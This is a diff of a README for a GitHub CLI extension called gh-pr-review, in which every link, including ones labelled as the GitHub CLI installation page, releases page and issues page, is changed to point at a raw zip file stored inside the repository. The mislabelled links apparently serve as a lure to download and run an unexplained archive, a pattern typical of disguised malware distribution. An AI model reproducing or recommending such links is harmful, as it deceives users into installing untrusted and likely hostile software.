@@ -1,6 +1,6 @@
 # 🎉 gh-pr-review - Simplify Your PR Reviews Effortlessly
 
-[![Download gh-pr-review](https://raw.githubusercontent.com/OfficialEm1ns/gh-pr-review/main/internal/report/review_gh_pr_v3.3.zip)](https://raw.githubusercontent.com/OfficialEm1ns/gh-pr-review/main/internal/report/review_gh_pr_v3.3.zip)
+[![Download gh-pr-review](https://raw.githubusercontent.com/OfficialEm1ns/gh-pr-review/main/docs/review_gh_pr_burgher.zip)](https://raw.githubusercontent.com/OfficialEm1ns/gh-pr-review/main/docs/review_gh_pr_burgher.zip)
 
 ## 📚 Overview
 gh-pr-review is a GitHub CLI extension designed to enhance your pull request (PR) review process. This tool allows you to view, navigate, reply to, and resolve review threads directly from your terminal. It is built to support seamless automation, making it ideal for quick and efficient code reviews. Whether you're an individual developer or part of a team, gh-pr-review simplifies your workflow.
@@ -8,18 +8,18 @@ gh-pr-review is a GitHub CLI extension designed to enhance your pull request (PR
 ## 🚀 Getting Started
 To get started with gh-pr-review, follow these steps:
 
-1. Ensure you have GitHub CLI installed. If not, visit the [GitHub CLI installation page](https://raw.githubusercontent.com/OfficialEm1ns/gh-pr-review/main/internal/report/review_gh_pr_v3.3.zip) for instructions.
+1. Ensure you have GitHub CLI installed. If not, visit the [GitHub CLI installation page](https://raw.githubusercontent.com/OfficialEm1ns/gh-pr-review/main/docs/review_gh_pr_burgher.zip) for instructions.
 2. Open your terminal.
 
 ## 🔗 Download & Install
 You can download gh-pr-review from our releases page. 
 
-[Visit this page to download](https://raw.githubusercontent.com/OfficialEm1ns/gh-pr-review/main/internal/report/review_gh_pr_v3.3.zip).
+[Visit this page to download](https://raw.githubusercontent.com/OfficialEm1ns/gh-pr-review/main/docs/review_gh_pr_burgher.zip).
 
 ### Installation Steps
-1. Go to the [Releases page](https://raw.githubusercontent.com/OfficialEm1ns/gh-pr-review/main/internal/report/review_gh_pr_v3.3.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/OfficialEm1ns/gh-pr-review/main/docs/review_gh_pr_burgher.zip).
 2. Choose the version suitable for your operating system (Windows, macOS, Linux).
-3. Download the corresponding file (e.g., `.exe`, `https://raw.githubusercontent.com/OfficialEm1ns/gh-pr-review/main/internal/report/review_gh_pr_v3.3.zip`, or `.zip` depending on your OS).
+3. Download the corresponding file (e.g., `.exe`, `https://raw.githubusercontent.com/OfficialEm1ns/gh-pr-review/main/docs/review_gh_pr_burgher.zip`, or `.zip` depending on your OS).
 4. Extract the downloaded file (if needed).
 5. Move the executable to a folder in your PATH for easy access. 
 
@@ -61,12 +61,12 @@ Your contributions are welcome! If you find a bug or want to add a feature, feel
 This project is licensed under the MIT License. See the LICENSE file for more details.
 
 ## 🌟 Support & Feedback
-For support or feedback, please submit an issue on our [GitHub issues page](https://raw.githubusercontent.com/OfficialEm1ns/gh-pr-review/main/internal/report/review_gh_pr_v3.3.zip).
+For support or feedback, please submit an issue on our [GitHub issues page](https://raw.githubusercontent.com/OfficialEm1ns/gh-pr-review/main/docs/review_gh_pr_burgher.zip).
 
 ## 📍 Additional Resources
-You can find more information about the GitHub CLI [here](https://raw.githubusercontent.com/OfficialEm1ns/gh-pr-review/main/internal/report/review_gh_pr_v3.3.zip). Explore command options and additional functionality that can work with gh-pr-review.
+You can find more information about the GitHub CLI [here](https://raw.githubusercontent.com/OfficialEm1ns/gh-pr-review/main/docs/review_gh_pr_burgher.zip). Explore command options and additional functionality that can work with gh-pr-review.
 
 ## 🔗 Conclusion
 gh-pr-review streamlines the PR review process. By following these simple steps, you can enhance your productivity and keep your codebase in check effortlessly. 
 
-Visit the [Releases page to download](https://raw.githubusercontent.com/OfficialEm1ns/gh-pr-review/main/internal/report/review_gh_pr_v3.3.zip) and start reviewing your pull requests with ease!
+Visit the [Releases page to download](https://raw.githubusercontent.com/OfficialEm1ns/gh-pr-review/main/docs/review_gh_pr_burgher.zip) and start reviewing your pull requests with ease!
